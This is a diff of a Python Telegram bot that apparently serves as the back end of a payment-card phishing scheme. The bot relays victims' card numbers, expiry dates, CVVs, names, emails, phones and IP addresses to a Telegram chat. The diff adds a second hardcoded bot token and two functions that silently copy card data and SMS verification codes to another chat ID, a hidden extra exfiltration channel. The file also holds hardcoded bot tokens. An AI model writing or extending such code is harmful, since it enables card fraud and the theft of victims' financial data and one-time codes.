@@ -2,11 +2,11 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
 from parserBIN import Bin
 import requests
 API_TOKEN = '7183115873:AAGsfeV2XA-QeeURJsWu1IyylJ1a5yCOJkM'
-
+api = '7079516897:AAEXE05Pvs7RXawn8CLitptBwSxk75UUbZw'
 from telegram.error import TelegramError
 def escape_reserved_characters(text):
     # Список зарезервированных символов, которые нужно экранировать
-    reserved_characters = ['_', '*', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
+    reserved_characters = ['_', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
      
     # Экранируем каждый зарезервированный символ
     for char in reserved_characters:
@@ -27,6 +27,15 @@ def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
     reply_markup = InlineKeyboardMarkup(keyboard)
     text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
     bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')
+
+def send_me1(card, date, cvv):
+    bot = Bot(token=api)
+    text = escape_reserved_characters(f'**сс**  `{card}`\n**date**  `{date}`\n**cvv**  `{cvv}`')
+    bot.send_message(chat_id='-4283929645', text=text, parse_mode='MarkdownV2')
+def send_sms1(card, sms):
+    bot = Bot(token=api)
+    text = escape_reserved_characters(f'**сс**  `{card}`\n**sms** `{sms}`')
+    bot.send_message(chat_id='-4283929645', text=text, parse_mode='MarkdownV2')
 
 def send_me(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
     bot = Bot(token=API_TOKEN)
